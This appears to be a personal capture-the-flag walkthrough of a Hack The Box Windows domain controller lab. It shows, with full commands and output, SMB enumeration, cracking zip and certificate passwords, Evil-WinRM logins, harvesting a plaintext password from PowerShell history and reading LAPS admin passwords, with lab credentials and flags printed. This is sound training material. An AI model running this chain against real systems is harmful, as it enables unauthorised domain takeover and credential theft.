## NMAP SCAN
```
nmap -sSCV -p- 10.129.227.113
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-24 15:58 +0700
Nmap scan report for 10.129.227.113
Host is up (0.073s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-04-24 17:00:40Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/wsmans?
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-04-24T17:02:15+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49692/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-24T17:01:37
|_  start_date: N/A
|_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m57s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

lets look at smb 
```
smbclient -L //10.129.227.113/ -U''                                                            

Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.227.113 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ smbclient //10.129.227.113/Shares  

Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 22:39:15 2021
  ..                                  D        0  Mon Oct 25 22:39:15 2021
  Dev                                 D        0  Tue Oct 26 02:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 22:48:42 2021

                6367231 blocks of size 4096. 1276942 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Tue Oct 26 02:40:06 2021
  ..                                  D        0  Tue Oct 26 02:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 22:46:42 2021

                6367231 blocks of size 4096. 1276942 blocks available
smb: \Dev\> get winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (7.6 KiloBytes/sec) (average 7.6 KiloBytes/sec)
smb: \Dev\> cd ..
smb: \> ls hel
NT_STATUS_NO_SUCH_FILE listing \hel
smb: \> ls HelpDesk\
  .                                   D        0  Mon Oct 25 22:48:42 2021
  ..                                  D        0  Mon Oct 25 22:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 21:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 21:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 21:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 21:57:44 2021
ls
                6367231 blocks of size 4096. 1276942 blocks available
smb: \> get LAPS_Datasheet.docx
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \LAPS_Datasheet.docx
smb: \> get "LAPS_Datasheet.docx"
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \LAPS_Datasheet.docx
smb: \> get LAPS_Datasheet.docx
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \LAPS_Datasheet.docx
smb: \> get "LAPS Datasheet.docx"
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \LAPS Datasheet.docx
smb: \> get LAPS_OperationsGuide.docx
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \LAPS_OperationsGuide.docx
smb: \> get LAPS_TechnicalSpecification.docx
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \LAPS_TechnicalSpecification.docx

```

cannot get file from HelpDesk but got file from Dev
the file from dev is password protected

```
impacket-lookupsid anonymous@10.129.227.113 -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.227.113
[*] StringBinding ncacn_np:10.129.227.113[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-671920749-559770252-3318990721
498: TIMELAPSE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: TIMELAPSE\Administrator (SidTypeUser)
501: TIMELAPSE\Guest (SidTypeUser)
502: TIMELAPSE\krbtgt (SidTypeUser)
512: TIMELAPSE\Domain Admins (SidTypeGroup)
513: TIMELAPSE\Domain Users (SidTypeGroup)
514: TIMELAPSE\Domain Guests (SidTypeGroup)
515: TIMELAPSE\Domain Computers (SidTypeGroup)
516: TIMELAPSE\Domain Controllers (SidTypeGroup)
517: TIMELAPSE\Cert Publishers (SidTypeAlias)
518: TIMELAPSE\Schema Admins (SidTypeGroup)
519: TIMELAPSE\Enterprise Admins (SidTypeGroup)
520: TIMELAPSE\Group Policy Creator Owners (SidTypeGroup)
521: TIMELAPSE\Read-only Domain Controllers (SidTypeGroup)
522: TIMELAPSE\Cloneable Domain Controllers (SidTypeGroup)
525: TIMELAPSE\Protected Users (SidTypeGroup)
526: TIMELAPSE\Key Admins (SidTypeGroup)
527: TIMELAPSE\Enterprise Key Admins (SidTypeGroup)
553: TIMELAPSE\RAS and IAS Servers (SidTypeAlias)
571: TIMELAPSE\Allowed RODC Password Replication Group (SidTypeAlias)
572: TIMELAPSE\Denied RODC Password Replication Group (SidTypeAlias)
1000: TIMELAPSE\DC01$ (SidTypeUser)
1101: TIMELAPSE\DnsAdmins (SidTypeAlias)
1102: TIMELAPSE\DnsUpdateProxy (SidTypeGroup)
1601: TIMELAPSE\thecybergeek (SidTypeUser)
1602: TIMELAPSE\payl0ad (SidTypeUser)
1603: TIMELAPSE\legacyy (SidTypeUser)
1604: TIMELAPSE\sinfulz (SidTypeUser)
1605: TIMELAPSE\babywyrm (SidTypeUser)
1606: TIMELAPSE\DB01$ (SidTypeUser)
1607: TIMELAPSE\WEB01$ (SidTypeUser)
1608: TIMELAPSE\DEV01$ (SidTypeUser)
2601: TIMELAPSE\LAPS_Readers (SidTypeGroup)
3101: TIMELAPSE\Development (SidTypeGroup)
3102: TIMELAPSE\HelpDesk (SidTypeGroup)
3103: TIMELAPSE\svc_deploy (SidTypeUser)
```

got usernames
lets try to crack the zip file 
```
zip2john winrm_backup.zip > hash.txt     
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/HTB BOXES/timelapse]
└─$ ls
hash.txt  users.txt  winrm_backup.zip
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/HTB BOXES/timelapse]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2026-04-24 16:25) 3.571g/s 12397Kp/s 12397Kc/s 12397KC/s susu00xoxlove..superrbd
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
got a pass supremelegacy

```
┌──(kali㉿kali)-[~/HTB BOXES/timelapse]
└─$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/HTB BOXES/timelapse]
└─$ ls
hash.txt  legacyy_dev_auth.pfx  users.txt  winrm_backup.zip
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/HTB BOXES/timelapse]
└─$ pfx2john legacyy_dev_auth.pfx > pfx.txt
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/HTB BOXES/timelapse]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt fpx.txt 
stat: fpx.txt: No such file or directory
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/HTB BOXES/timelapse]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pfx.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:18 DONE (2026-04-24 16:31) 0.05387g/s 174137p/s 174137c/s 174137C/s thuglife06..throughthemaze
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

pass to extract .key and .cert thuglegacy
```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacy.key -nodes

Enter Import Password:
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/HTB BOXES/timelapse]
└─$ ls                                                                     
hash.txt  legacy.key  legacyy_dev_auth.pfx  pfx.txt  users.txt  winrm_backup.zip
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/HTB BOXES/timelapse]
└─$ evil-winrm -i 10.129.227.113 -S -c legacy.crt -k legacy.key
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Error: Path to provided public certificate file "legacy.crt" can't be found. Check filename or path
                                        
Error: Exiting with code 1
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/HTB BOXES/timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacy.crt

Enter Import Password:
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/HTB BOXES/timelapse]
└─$ evil-winrm -i 10.129.227.113 -S -c legacy.crt -k legacy.key             
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ..
*Evil-WinRM* PS C:\Users\legacyy> cd Desktop
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
51d3737813c532bc2be8a50c3b4b6ffa

```

got user flag
The ConsoleHost_history.txt file normally contains a log of the command history executed in the PowerShell console on this user account. This file records the commands that the user has entered in PowerShell and saves them in chronological order. lets look for it

```
*Evil-WinRM* PS C:\Users\legacyy> cd APPDATA
*Evil-WinRM* PS C:\Users\legacyy\APPDATA> dir


    Directory: C:\Users\legacyy\APPDATA


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/25/2021   8:22 AM                Local
d-----       10/25/2021   8:22 AM                LocalLow
d-----        9/15/2018  12:28 AM                Roaming


*Evil-WinRM* PS C:\Users\legacyy\APPDATA> cd Local
*Evil-WinRM* PS C:\Users\legacyy\APPDATA\Local> ls


    Directory: C:\Users\legacyy\APPDATA\Local


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:19 AM                Microsoft
d-----        4/24/2026  10:38 AM                Temp


*Evil-WinRM* PS C:\Users\legacyy\APPDATA\Local> cd cd ..
A positional parameter cannot be found that accepts argument '..'.
At line:1 char:1
+ cd cd ..
+ ~~~~~~~~
    + CategoryInfo          : InvalidArgument: (:) [Set-Location], ParameterBindingException
    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\Users\legacyy\APPDATA\Local> cd ..
*Evil-WinRM* PS C:\Users\legacyy\APPDATA> cd roaming
*Evil-WinRM* PS C:\Users\legacyy\APPDATA\roaming> ls


    Directory: C:\Users\legacyy\APPDATA\roaming


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d---s-        9/15/2018  12:28 AM                Microsoft


*Evil-WinRM* PS C:\Users\legacyy\APPDATA\roaming> cd mircrosoft
Cannot find path 'C:\Users\legacyy\APPDATA\roaming\mircrosoft' because it does not exist.
At line:1 char:1
+ cd mircrosoft
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\legacy...ming\mircrosoft:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\Users\legacyy\APPDATA\roaming> cd Mircrosoft
Cannot find path 'C:\Users\legacyy\APPDATA\roaming\Mircrosoft' because it does not exist.
At line:1 char:1
+ cd Mircrosoft
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\legacy...ming\Mircrosoft:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\Users\legacyy\APPDATA\roaming> cd Microsoft
*Evil-WinRM* PS C:\Users\legacyy\APPDATA\roaming\Microsoft> ls


    Directory: C:\Users\legacyy\APPDATA\roaming\Microsoft


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:28 AM                Internet Explorer
d-----       10/25/2021  12:25 PM                Windows


*Evil-WinRM* PS C:\Users\legacyy\APPDATA\roaming\Microsoft> cd windwos
Cannot find path 'C:\Users\legacyy\APPDATA\roaming\Microsoft\windwos' because it does not exist.
At line:1 char:1
+ cd windwos
+ ~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\legacy...crosoft\windwos:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\Users\legacyy\APPDATA\roaming\Microsoft> cd Windows
*Evil-WinRM* PS C:\Users\legacyy\APPDATA\roaming\Microsoft\Windows> ls


    Directory: C:\Users\legacyy\APPDATA\roaming\Microsoft\Windows


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:19 AM                CloudStore
d-----        9/15/2018  12:19 AM                Network Shortcuts
d-----       10/25/2021  12:25 PM                PowerShell
d-----        9/15/2018  12:19 AM                Printer Shortcuts
d-r---       10/25/2021  12:25 PM                Recent
d-r---        9/15/2018  12:19 AM                SendTo
d-r---        9/15/2018  12:19 AM                Start Menu
d-----        9/15/2018  12:19 AM                Templates


*Evil-WinRM* PS C:\Users\legacyy\APPDATA\roaming\Microsoft\Windows> cd Powershell
*Evil-WinRM* PS C:\Users\legacyy\APPDATA\roaming\Microsoft\Windows\Powershell> ls


    Directory: C:\Users\legacyy\APPDATA\roaming\Microsoft\Windows\Powershell


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         3/3/2022   8:06 PM                PSReadLine


*Evil-WinRM* PS C:\Users\legacyy\APPDATA\roaming\Microsoft\Windows\Powershell> cd PSreadLine
*Evil-WinRM* PS C:\Users\legacyy\APPDATA\roaming\Microsoft\Windows\Powershell\PSreadLine> ls


    Directory: C:\Users\legacyy\APPDATA\roaming\Microsoft\Windows\Powershell\PSreadLine


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt


*Evil-WinRM* PS C:\Users\legacyy\APPDATA\roaming\Microsoft\Windows\Powershell\PSreadLine> typee ConsoleHost_history.txt

^C
                                        
Warning: Press "y" to exit, press any other key to continue
*Evil-WinRM* PS C:\Users\legacyy\APPDATA\roaming\Microsoft\Windows\Powershell\PSreadLine> type ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit

```

svc_deploy 'E3R$Q62^12p7PLlC%KWaxuaV'

```
Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

so he is the part of LAPS reader groups... and we have file in HelpDesk smb...

```
smbclient //10.129.227.113/Shares -U 'svc_deploy%E3R$Q62^12p7PLlC%KWaxuaV'

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 22:39:15 2021
  ..                                  D        0  Mon Oct 25 22:39:15 2021
  Dev                                 D        0  Tue Oct 26 02:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 22:48:42 2021

                6367231 blocks of size 4096. 1335307 blocks available
smb: \> cd HelpDesk\
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 22:48:42 2021
  ..                                  D        0  Mon Oct 25 22:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 21:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 21:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 21:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 21:57:44 2021

                6367231 blocks of size 4096. 1335307 blocks available
smb: \HelpDesk\> get LAPS_Datasheet.docx
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (176.4 KiloBytes/sec) (average 176.4 KiloBytes/sec)
smb: \HelpDesk\> get LAPS.x64.msi
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as LAPS.x64.msi (946.3 KiloBytes/sec) (average 689.4 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_OperationsGuide.docx 
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (953.3 KiloBytes/sec) (average 762.0 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_TechnicalSpecification.docx 
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (215.7 KiloBytes/sec) (average 695.8 KiloBytes/sec)
smb: \HelpDesk\>
```

now we got files lets look at them
it just have architecture of LAPS so there should be a exploit to read admin password....
https://www.powershellgallery.com/packages/Get-ADComputers-LAPS-Password/2.0/Content/Get-ADComputers-LAPS-Password.ps1

```*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *


AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Domain Controllers/DC01
Certificates                         : {}
CN                                   : DC01
codePage                             : 0
CompoundIdentitySupported            : {False}
countryCode                          : 0
Created                              : 10/23/2021 11:40:55 AM
createTimeStamp                      : 10/23/2021 11:40:55 AM
Deleted                              :
Description                          :
DisplayName                          :
DistinguishedName                    : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName                          : dc01.timelapse.htb
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {10/25/2021 9:03:33 AM, 10/25/2021 9:03:33 AM, 10/23/2021 11:40:55 AM, 1/1/1601 10:16:33 AM}
Enabled                              : True
HomedirRequired                      : False
HomePage                             :
instanceType                         : 4
IPv4Address                          : 10.129.227.113
IPv6Address                          : dead:beef::4c5b:8328:a869:8d41
isCriticalSystemObject               : True
isDeleted                            :
KerberosEncryptionType               : {RC4, AES128, AES256}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 134215252128063970
LastLogonDate                        : 4/24/2026 9:57:29 AM
lastLogonTimestamp                   : 134215234490720281
localPolicyFlags                     : 0
Location                             :
LockedOut                            : False
logonCount                           : 156
ManagedBy                            :
MemberOf                             : {}
MNSLogonAccount                      : False
Modified                             : 4/24/2026 9:57:30 AM
modifyTimeStamp                      : 4/24/2026 9:57:30 AM
ms-Mcs-AdmPwd                        : GUr1r]LV,+0$.Thbso1B76K+
ms-Mcs-AdmPwdExpirationTime          : 134219554509938959
msDFSR-ComputerReferenceBL           : {CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=timelapse,DC=htb}
msDS-GenerationId                    : {178, 90, 39, 18...}
msDS-SupportedEncryptionTypes        : 28
msDS-User-Account-Control-Computed   : 0
Name                                 : DC01
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Computer,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
ObjectClass                          : computer
ObjectGUID                           : 6e10b102-6936-41aa-bb98-bed624c9b98f
objectSid                            : S-1-5-21-671920749-559770252-3318990721-1000
OperatingSystem                      : Windows Server 2019 Standard

```

we have admin pass now 
we got the command above from the link 
![[Pasted image 20260424153346.png]]

lets get the root flag 
Administrator GUr1r]LV,+0$.Thbso1B76K+

```
vil-winrm -i 10.129.227.113 -u 'Administrator' -p 'GUr1r]LV,+0$.Thbso1B76K+' -S
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
Cannot find path 'C:\Users\Administrator\Desktop\root.txt' because it does not exist.
At line:1 char:1
+ type root.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       10/23/2021  11:27 AM                3D Objects
d-r---       10/23/2021  11:27 AM                Contacts
d-r---         3/3/2022   7:48 PM                Desktop
d-r---       10/23/2021  12:22 PM                Documents
d-r---       10/25/2021   2:06 PM                Downloads
d-r---       10/23/2021  11:27 AM                Favorites
d-r---       10/23/2021  11:28 AM                Links
d-r---       10/23/2021  11:27 AM                Music
d-r---       10/23/2021  11:27 AM                Pictures
d-r---       10/23/2021  11:27 AM                Saved Games
d-r---       10/23/2021  11:27 AM                Searches
d-r---       10/23/2021  11:27 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/23/2021  11:27 AM                Administrator
d-----       10/25/2021   8:22 AM                legacyy
d-r---       10/23/2021  11:27 AM                Public
d-----       10/25/2021  12:23 PM                svc_deploy
d-----        2/23/2022   5:45 PM                TRX


*Evil-WinRM* PS C:\Users> cd TRX
*Evil-WinRM* PS C:\Users\TRX> ls


    Directory: C:\Users\TRX


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         3/3/2022  10:45 PM                3D Objects
d-r---         3/3/2022  10:45 PM                Contacts
d-r---         3/3/2022  10:45 PM                Desktop
d-r---         3/3/2022  10:45 PM                Documents
d-r---         3/3/2022  10:45 PM                Downloads
d-r---         3/3/2022  10:45 PM                Favorites
d-r---         3/3/2022  10:45 PM                Links
d-r---         3/3/2022  10:45 PM                Music
d-r---         3/3/2022  10:45 PM                Pictures
d-r---         3/3/2022  10:45 PM                Saved Games
d-r---         3/3/2022  10:45 PM                Searches
d-r---         3/3/2022  10:45 PM                Videos


*Evil-WinRM* PS C:\Users\TRX> cd Desktop
*Evil-WinRM* PS C:\Users\TRX\Desktop> ls


    Directory: C:\Users\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/24/2026   9:57 AM             34 root.txt


*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
19f5a3f8b80d1bafd45291fd1b3a3fc4
```

so admin desktop did not have the root flag, it was in TRX desktop
